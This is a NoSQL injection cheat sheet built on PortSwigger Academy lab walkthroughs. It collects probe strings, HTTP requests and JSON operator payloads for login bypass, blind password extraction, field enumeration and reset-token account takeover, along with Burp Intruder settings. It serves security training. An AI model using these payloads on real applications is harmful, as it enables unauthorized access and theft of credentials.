# NoSQL Injection — CTF Cheat Sheet

**Tools:** Burp Suite Community / Professional, browser DevTools  
**Practice:** PortSwigger Web Security Academy  
**Scope:** Authorized CTFs and lab environments only

---

## 1. CTF methodology

When facing NoSQL targets (MongoDB, CouchDB, etc.) in a CTF or lab:

1. **Map parameters & Content-Types:** Identify whether data is passed as URL query strings, form-encoded parameters, or JSON bodies.
2. **Test syntax breakage (JavaScript context):** Inject `'`, `"`, `\`, `;`, `//` into inputs to trigger 500 errors or JavaScript syntax warnings.
3. **Test operator injection (Object injection):** Convert string parameters to JSON objects (e.g., `{"$ne": ""}`) or query parameter arrays (`user[$ne]=`).
4. **Establish a boolean oracle:** Find two payloads where one causes a "True" condition (data returned / 200 OK / specific message) and the other causes a "False" condition (missing data / error / "user not found").
5. **Determine length first:** Always find target length before extracting characters (`this.field.length == N`).
6. **Automate exfiltration:** Use Burp Intruder (Cluster Bomb) or Python scripts for character-by-character exfiltration.

---

## 2. Attack-surface & Quick Recon Payloads

### Fast Detection Probes (Copy & Paste)

```text
'
"
\
' || 1==1 //
' && 1==0 //
Gifts'+'
Gifts'||1||'
{"$ne": ""}
{"$regex": ".*"}
{"$gt": ""}
{"$where": "1"}
```

### JSON vs URL-encoded formats

| Context | String Test | Operator Test |
|---|---|---|
| **JSON Body** | `"username": "admin'"` | `"username": {"$ne": "invalid"}` |
| **URL Query** | `?username=admin'` | `?username[$ne]=invalid` |
| **Form POST** | `username=admin'` | `username[$ne]=invalid` |

---

## 3. Detecting NoSQL injection (Syntax Concatenation)

**Lab:** Detecting NoSQL injection — Apprentice  
**Core weakness:** User input is concatenated directly into a server-side JavaScript expression / MongoDB query without sanitization.

### CTF approach

1. Intercept the target request (e.g. `GET /filter?category=Gifts`) and send to **Repeater**.
2. Submit `'` in the parameter:
   ```http
   GET /filter?category=Gifts' HTTP/2
   ```
   **Signal:** JavaScript syntax error or 500 Internal Server Error.
3. Test JS string concatenation with URL encoding (`Ctrl+U`):
   ```http
   GET /filter?category=Gifts'%2b' HTTP/2
   ```
   **Signal:** 200 OK with normal results returned. Confirms string concatenation inside server-side JS.
4. Establish boolean conditions:
   - **False:** `category=Gifts'%20%26%26%200%20%26%26%20'x` *(Raw: `Gifts' && 0 && 'x`)* → 0 products returned.
   - **True:** `category=Gifts'%20%26%26%201%20%26%26%20'x` *(Raw: `Gifts' && 1 && 'x`)* → Normal products returned.
5. Exploit with an always-true condition:
   ```http
   GET /filter?category=Gifts'%7c%7c1%7c%7c' HTTP/2
   ```
   *(Raw: `Gifts'||1||'`)*
6. **Result:** Bypasses released-status filter; displays hidden and unreleased products.

**CTF clue:** If `'` throws a syntax error and `'+'` restores the page, the backend is evaluating JavaScript string concatenation.

---

## 4. Authentication bypass via operator injection

**Lab:** Exploiting NoSQL operator injection to bypass authentication — Apprentice  
**Core weakness:** Backend accepts JSON input directly into a query function without type-checking, allowing MongoDB query operators (`$ne`, `$regex`, `$gt`).

### Baseline Request
```http
POST /login HTTP/2
Host: target-lab.net
Content-Type: application/json

{"username":"wiener","password":"peter"}
```

### CTF approach

1. Probe `$ne` (not equal) on `username`:
   ```json
   {"username":{"$ne":""},"password":"peter"}
   ```
   Logs into `wiener` (confirms `$ne` is processed).
2. Probe `$regex` pattern matching:
   ```json
   {"username":{"$regex":"wien.*"},"password":"peter"}
   ```
   Logs into `wiener`.
3. Test bypassing password verification with `$ne`:
   ```json
   {"username":{"$ne":""},"password":{"$ne":""}}
   ```
   **Signal:** If an error or `Account locked: too many records` occurs, the query returned multiple users while the application expected one.
4. Constrain target to administrator:
   ```json
   {"username":{"$regex":"admin.*"},"password":{"$ne":""}}
   ```
   *or:*
   ```json
   {"username":"administrator","password":{"$ne":""}}
   ```
5. **Result:** Authenticated as `administrator`. Extract session cookie or right-click → **Show response in browser**.

**CTF clue:** When password checks cannot be removed, check if replacing string parameters with `{"$ne": ""}` bypasses the check entirely.

---

## 5. Blind data exfiltration via boolean conditions

**Lab:** Exploiting NoSQL injection to extract data — Practitioner  
**Core weakness:** Parameter is injected into a database query where responses differ between True and False conditions, exposing document properties via `this.<field>`.

### CTF approach

1. **Find the Oracle:**
   - Target: `GET /user/lookup?user=wiener`
   - True: `wiener' && '1'=='1` (URL-encoded) → Returns user details.
   - False: `wiener' && '1'=='2` (URL-encoded) → Returns `Could not find user`.

2. **Determine Password Length:**
   Inject length checks on `this.password`:
   ```http
   GET /user/lookup?user=administrator'%20%26%26%20this.password.length<30%20%7c%7c%20'a'=='b HTTP/2
   ```
   *(Raw: `administrator' && this.password.length < 30 || 'a'=='b`)*
   - Test descending numbers:
     - `< 9` → Returns administrator details (True).
     - `< 8` → Returns `Could not find user` (False).
   - **Conclusion:** Password length is exactly **8**.

3. **Intruder Character Exfiltration:**
   - In Repeater, set the payload:
     ```text
     administrator' && this.password[§0§]=='§a§
     ```
   - Highlight & URL-encode: `Ctrl+U`.
   - Send to **Intruder**:
     - **Attack type:** `Cluster bomb`
     - **Position 1 (Index):** `Numbers` → `0` to `7`, step `1`.
     - **Position 2 (Char):** `Simple list` → `a-z` (or lowercase + digits).
   - In **Settings → Grep - Match**: add flag for administrator profile indicator.
   - Start attack, sort by Payload 1 and Match flag: note the character for each index `0` through `7`.
4. **Result:** Log in with `administrator:<extracted_password>`.

**CTF clue:** In MongoDB JS contexts, `this` refers to the current record. Use `this.password[index]` or `this.password.charCodeAt(index)` for character-by-character extraction.

---

## 6. Extracting unknown fields & sensitive tokens via `$where`

**Lab:** Exploiting NoSQL operator injection to extract unknown fields — Practitioner  
**Core weakness:** Application accepts JSON operator `$where`, enabling arbitrary JavaScript execution and schema reflection via `Object.keys(this)`.

### CTF approach

1. **Confirm `$where` JavaScript Evaluation:**
   ```json
   {"username":"carlos","password":{"$ne":"invalid"},"$where":"0"}
   ```
   → `Invalid username or password` (False).

   ```json
   {"username":"carlos","password":{"$ne":"invalid"},"$where":"1"}
   ```
   → `Account locked` (True condition confirmed).

2. **Extract Unknown Field Names (Schema Enumeration):**
   Use `Object.keys(this)[index]` to iterate over all document properties:
   ```json
   {
     "username": "carlos",
     "password": {"$ne": "invalid"},
     "$where": "Object.keys(this)[1].match('^.{§0§}§a§.*')"
   }
   ```
   - **Attack type:** `Cluster bomb`
   - **Position 1 (Offset):** Numbers `0` to `20`.
   - **Position 2 (Character):** `a-z`, `A-Z`, `0-9`.
   - **Match Flag:** Look for `Account locked`.
   - Increment array index (`[0]`, `[1]`, `[2]`, `[3]`, etc.):
     - `Object.keys(this)[0]` → `_id`
     - `Object.keys(this)[1]` → `username`
     - `Object.keys(this)[2]` → `password`
     - `Object.keys(this)[3]` → Hidden token parameter (e.g., `unlockToken` or `resetToken`).

3. **Verify Discovered Field Against Endpoint:**
   - In **Proxy → HTTP history**, find `GET /forgot-password`.
   - Test: `GET /forgot-password?DISCOVERED_TOKEN=invalid`
   - Response returns `Invalid token` (proves endpoint recognizes the token field name).

4. **Extract the Token Value:**
   - Update `$where` payload in Intruder:
     ```json
     {
       "username": "carlos",
       "password": {"$ne": "invalid"},
       "$where": "this.DISCOVERED_TOKEN.match('^.{§0§}§a§.*')"
     }
     ```
   - Run Intruder Cluster Bomb to extract the full token string.

5. **Account Takeover:**
   - Visit: `GET /forgot-password?DISCOVERED_TOKEN=EXTRACTED_VALUE`
   - Set new password and log in as target user.

**CTF clue:** When you don't know the column/field names in NoSQL, use JavaScript reflection: `Object.keys(this)` is the NoSQL equivalent of `information_schema.columns`.

---

## 7. Common CTF vulnerability chains

### Chain A — Filter bypass to hidden objects
```text
Filter parameter → JS syntax injection ('||1||') → Query evaluates true → Unreleased flags/products exposed
```

### Chain B — JSON Operator auth bypass
```text
Login JSON → Replace "password" with {"$ne": ""} → Single match forced → Admin session granted
```

### Chain C — Blind password recovery
```text
User lookup → Boolean injection → this.password.length → this.password[i] → Password recovered
```

### Chain D — Schema exfiltration & Account takeover
```text
JSON $where → Object.keys(this)[n] → Discover resetToken → Exfiltrate token value → Reset admin password
```

---

## 8. Burp Suite Intruder cheat sheet

| Goal | Attack Type | Payload 1 | Payload 2 | Success Indicator |
|---|---|---|---|---|
| **Password Length** | Sniper | Numbers `1..50` | — | Length / status difference |
| **Password Chars** | Cluster bomb | Index `0..N` | `a-z`, `0-9` | Profile returned / 200 OK |
| **Field Name** | Cluster bomb | Offset `0..25` | `a-zA-Z0-9` | True oracle (`Account locked`) |
| **Token Value** | Cluster bomb | Offset `0..32` | `a-zA-Z0-9` | True oracle (`Account locked`) |

### Pro-Tips for CTFs:
- **Hotkeys:** Highlight payload and press `Ctrl+U` in Repeater/Intruder to instantly URL-encode query strings.
- **Intruder Grep - Match:** Always set a Grep Match string for the positive state (`Account locked`, `email`, `id`) to sort hits to the top in one click.
- **Resource Pool:** If requests timeout or the server rate-limits, throttle to 10 concurrent requests in Intruder Settings.

---

## 9. Quick reference

| CTF Scenario | Attack Vector | Payload / Technique |
|---|---|---|
| Product filter bypass | String concatenation | `'||1||'` or `'%7c%7c1%7c%7c'` |
| Login without password | Operator injection | `{"password": {"$ne": ""}}` |
| Target specific user | Regex operator | `{"username": {"$regex": "^admin.*"}}` |
| Exfiltrate known field | Blind Boolean | `' && this.password.startsWith('a') //` |
| Exfiltrate by index | Array index match | `' && this.password[0]=='a' //` |
| Unknown schema discovery | JS Reflection | `Object.keys(this)[i].match('^.{offset}char.*')` |
| Arbitrary JS execution | Operator injection | `{"$where": "this.user == 'admin'"}` |

---

## 10. Further reading

- [PortSwigger NoSQL Injection](https://portswigger.net/web-security/nosql-injection)
- [PortSwigger Lab: Detecting NoSQL injection](https://portswigger.net/web-security/nosql-injection/lab-nosql-injection-detection)
- [PortSwigger Lab: Authentication bypass](https://portswigger.net/web-security/nosql-injection/lab-nosql-injection-bypass-authentication)
- [PortSwigger Lab: Extract data](https://portswigger.net/web-security/nosql-injection/lab-nosql-injection-extract-data)
- [PortSwigger Lab: Extract unknown fields](https://portswigger.net/web-security/nosql-injection/lab-nosql-injection-extract-unknown-fields)

**Scope:** Use these techniques only in authorized CTFs, PortSwigger Academy labs, and systems where you have explicit permission.
